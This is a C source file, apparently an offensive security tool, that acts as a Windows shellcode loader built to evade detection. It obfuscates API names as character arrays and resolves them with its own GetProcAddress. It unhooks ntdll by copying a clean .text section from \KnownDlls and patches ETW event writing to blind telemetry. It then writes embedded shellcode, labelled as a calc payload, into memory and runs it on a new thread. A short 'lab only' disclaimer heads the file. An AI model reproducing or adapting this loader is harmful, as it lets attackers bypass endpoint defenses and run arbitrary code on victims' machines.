
/*
 *		Author: r3x5
 *		GitHub: https://github.com/r3x5
 *
 *
 *		This code is only for test and lab enviroments
 * 
 *		any abusing use is strictly prohibited.
 *
 */

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "rpcrt4")

#define NtCurrentProcess() ((HANDLE)-1)

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* pNtOpenSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Protect
    );

pNtAllocateVirtualMemory g_NtAllocateVirtualMemory = NULL;
pNtProtectVirtualMemory g_NtProtectVirtualMemory = NULL;
pNtWriteVirtualMemory g_NtWriteVirtualMemory = NULL;
pNtCreateThreadEx g_NtCreateThreadEx = NULL;
pNtWaitForSingleObject g_NtWaitForSingleObject = NULL;

PVOID ReImplementGetProcAddress(HANDLE hModule, LPCSTR lpProcName) {
    if (!hModule || !lpProcName) {
        return NULL;
    }
    PBYTE pBase = (PBYTE)hModule;
    if (pBase[0] != 'M' || pBase[1] != 'Z') {
        return NULL;
    }
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pAddressOfFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    PVOID pFunc = NULL;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        if (strcmp((char*)(pBase + pAddressOfNames[i]), lpProcName) == 0) {
            pFunc = (PVOID)(pBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
    return (PVOID)pFunc;
}

PVOID FetchETWEventWrite() {
    char etwEventWriteName[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e','F','u','l','l',0 };
    char ntdllName[] = { 'n','t','d','l','l','.','d','l','l',0 };
    PBYTE pEtwEventWrite = (PBYTE)ReImplementGetProcAddress(GetModuleHandleA(ntdllName), etwEventWriteName);
    if (!pEtwEventWrite) {
        return FALSE;
    }
    char etwPatch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    DWORD MemPageSize = 0x1000;
    DWORD dwOldProtect = 0;
    int i = 0;

    while (TRUE) {
        if (pEtwEventWrite[i] == 0xC3 && pEtwEventWrite[i + 1] == 0xCC) {
            break;
        }
        i++;
    }

    while (i) {
        if (pEtwEventWrite[i] == 0xE8) {
            pEtwEventWrite = (PBYTE)&pEtwEventWrite[i];
            break;
        }
        i--;
    }

    // return null if the opcode is not a call
    if (pEtwEventWrite != NULL && pEtwEventWrite[0] != 0xE8) {
        return NULL;
    }

    // skip the call opcode
    pEtwEventWrite++;
    DWORD offset = *(PDWORD)pEtwEventWrite;
    pEtwEventWrite = sizeof(DWORD) + offset + pEtwEventWrite;

    return pEtwEventWrite;
}

BOOL PatchETW() {
    BYTE pS[3] = { 0x33, 0xC0, 0xC3 };
    SIZE_T pSsz = sizeof(pS);
    DWORD dwOldProtect = 0;
    PVOID pEtwEventWrite = FetchETWEventWrite();
    if (!pEtwEventWrite) {
        return FALSE;
    }
    printf("[+] ETW Event Write: %p\n", pEtwEventWrite);

    if (!VirtualProtect(pEtwEventWrite, pSsz, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[-] Failed to change memory protection\n");
        return FALSE;
    }

    memcpy(pEtwEventWrite, pS, pSsz);

    if (!VirtualProtect(pEtwEventWrite, pSsz, dwOldProtect, &dwOldProtect)) {
        printf("[-] Failed to restore memory protection\n");
        return FALSE;
    }

    printf("[+] ETW patched successfully\n");

    return TRUE;
}

LPVOID MapNtdll() {
    WCHAR path[] = L"\\KnownDlls\\ntdll.dll";

    UNICODE_STRING us;
    RtlInitUnicodeString(&us, path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    if (!NT_SUCCESS(NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa)))
        return NULL;

    PVOID base = NULL;
    SIZE_T size = 0;

    char NtMapViewOfSectionName[] = { 'N','t','M','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n',0 };
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)ReImplementGetProcAddress(GetModuleHandleA("ntdll.dll"), NtMapViewOfSectionName);

    if (!NtMapViewOfSection) {
        printf("[-] Failed to get NtMapViewOfSection\n");
        return NULL;
    }

    if (!NT_SUCCESS(NtMapViewOfSection(hSection, NtCurrentProcess(), &base, 0, 0, NULL, &size, 1, 0, PAGE_READONLY))) {
        printf("[-] Failed to map ntdll\n");
        return NULL;
    }

    return base;
}

BOOL UnhookKnownDlls(LPVOID md) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)md;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)md + pDos->e_lfanew);

    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER cur = &pSection[i];
        if (memcmp(cur->Name, ".text", 5) == 0) {
            PVOID base = (PBYTE)hNtdll + cur->VirtualAddress;
            SIZE_T size = cur->Misc.VirtualSize;
            ULONG old = 0;

            if (!NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old))) {
                printf("[-] Failed to change memory protection\n");
                return FALSE;
            }

            memcpy(base, (PBYTE)md + cur->VirtualAddress, size);

            if (!NT_SUCCESS(NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, old, &old))) {
                printf("[-] Failed to restore memory protection\n");
                return FALSE;
            }

            return TRUE;
        }
    }

    return FALSE;
}

BOOL isHooked(PVOID addr) {
    BYTE stub[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
    if (memcmp(addr, stub, sizeof(stub)) != 0)
        return TRUE;
    BYTE* p = (BYTE*)addr;
    if (p[4] == 0xE9 || p[4] == 0xE8)
        return TRUE;
    return FALSE;
}

int main() {
    char dllName[] = { 'n','t','d','l','l','.','d','l','l',0 };
    HMODULE hNtdll = GetModuleHandleA(dllName);
    char f1[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    char f2[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    char f3[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    char f4[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    char f5[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };

    if (isHooked(ReImplementGetProcAddress(hNtdll, f1))) {
        printf("[+] NtAllocateVirtualMemory is hooked\n");
    }
    if (isHooked(ReImplementGetProcAddress(hNtdll, f2))) {
        printf("[+] NtProtectVirtualMemory is hooked\n");
    }
    if (isHooked(ReImplementGetProcAddress(hNtdll, f3))) {
        printf("[+] NtCreateThreadEx is hooked\n");
    }

    LPVOID ndl = MapNtdll();
    if (!ndl) {
        printf("[-] Failed to map ntdll\n");
        return -1;
    }

    g_NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)ReImplementGetProcAddress(hNtdll, f1);
    g_NtProtectVirtualMemory = (pNtProtectVirtualMemory)ReImplementGetProcAddress(hNtdll, f2);
    g_NtWriteVirtualMemory = (pNtWriteVirtualMemory)ReImplementGetProcAddress(hNtdll, f4);
    g_NtCreateThreadEx = (pNtCreateThreadEx)ReImplementGetProcAddress(hNtdll, f3);
    g_NtWaitForSingleObject = (pNtWaitForSingleObject)ReImplementGetProcAddress(hNtdll, f5);

    printf("[+] Ntdll mapped at %p\n", ndl);
    if (!UnhookKnownDlls(ndl)) {
        printf("[-] Failed to unhook ntdll\n");
        return -1;
    }
    printf("[+] Ntdll unhooked\n");

    if (!PatchETW()) {
       printf("[-] Failed to patch ETW\n");
       return -1;
    }
    printf("[+] ETW patched\n");

    PVOID BaseAddress = NULL;
    SIZE_T dwSize = 0x2000;

    NTSTATUS ntstatus = NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ntstatus)) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", ntstatus);
        return -1;
    }
    printf("[+] Memory allocated at %p\n", BaseAddress);

    // calc shellcode
    unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };
    HANDLE hThread = NULL;
    DWORD dwOldProtect = 0;

    ntstatus = g_NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &dwSize, PAGE_READWRITE, &dwOldProtect);
    if (!NT_SUCCESS(ntstatus)) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", ntstatus);
        return -1;
    }
    printf("[+] Memory protected\n");

    ntstatus = g_NtWriteVirtualMemory(NtCurrentProcess(), BaseAddress, shellcode, sizeof(shellcode), NULL);
    if (!NT_SUCCESS(ntstatus)) {
        printf("[-] NtWriteVirtualMemory failed: 0x%X\n", ntstatus);
        return -1;
    }
    printf("[+] Shellcode written\n");

    ntstatus = g_NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &dwSize, PAGE_EXECUTE_READ, &dwOldProtect);
    if (!NT_SUCCESS(ntstatus)) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", ntstatus);
        return -1;
    }
    printf("[+] Memory protected\n");

    ntstatus = g_NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(ntstatus)) {
        printf("[-] NtCreateThreadEx failed: 0x%X\n", ntstatus);
        return -1;
    }

    g_NtWaitForSingleObject(hThread, FALSE, NULL);
    printf("[+] Thread executed\n");

    if (isHooked(ReImplementGetProcAddress(hNtdll, f1))) {
        printf("[+] NtAllocateVirtualMemory is still hooked\n");
    }
    else {
        printf("[!] NtAllocateVirtualMemory is not hooked\n");
    }
    if (isHooked(ReImplementGetProcAddress(hNtdll, f2))) {
        printf("[+] NtProtectVirtualMemory is still hooked\n");
    }
    else {
        printf("[!] NtProtectVirtualMemory is not hooked\n");
    }
    if (isHooked(ReImplementGetProcAddress(hNtdll, f3))) {
        printf("[+] NtCreateThreadEx is still hooked\n");
    }
    else {
        printf("[!] NtCreateThreadEx is not hooked\n");
    }

    printf("[+] Finished!\n");

    return 0;
}